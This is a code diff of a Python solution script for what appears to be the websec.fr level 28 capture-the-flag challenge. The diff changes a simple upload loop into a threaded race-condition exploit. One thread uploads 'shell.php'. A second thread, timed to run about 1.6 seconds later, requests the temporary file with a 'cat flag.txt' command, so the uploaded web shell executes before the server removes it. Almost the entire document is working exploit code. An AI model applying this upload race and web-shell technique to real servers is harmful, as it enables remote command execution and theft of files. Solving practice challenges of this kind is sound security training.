@@ -1,8 +1,33 @@
+import time
 import requests
+import threading
 
-url = 'http://websec.fr/level28/index.php'
-files = {'flag_file': open('28.php', 'rb'),'checksum':(None,'f'), 'submit':(None,'Upload and check')}
+def one():
 
-while True:
+    url = 'http://websec.fr/level28/index.php'
+    files = {'flag_file': open('shell.php', 'rb'), 'checksum':(None,'f'), 'submit':(None,'Upload and check')}
+    
+    start = time.time()
     response = requests.post(url, files=files)
-    print(response.text[1604:1604+36])
+    end = time.time()
+    
+    print('one', start, end, response.cookies.get_dict())
+
+
+def two():
+
+    url = 'http://websec.fr/level28/f3959b484667e8ab56a4e0cafba2b430.php?c=cat+flag.txt'
+    
+    start = time.time()
+    response = requests.get(url)
+    end = time.time()
+    
+    print('two', start, end, response.cookies.get_dict())
+
+t1 = threading.Thread(target=one)
+t2 = threading.Thread(target=two)
+
+t1.start()
+time.sleep(1.6)
+t2.start()
+
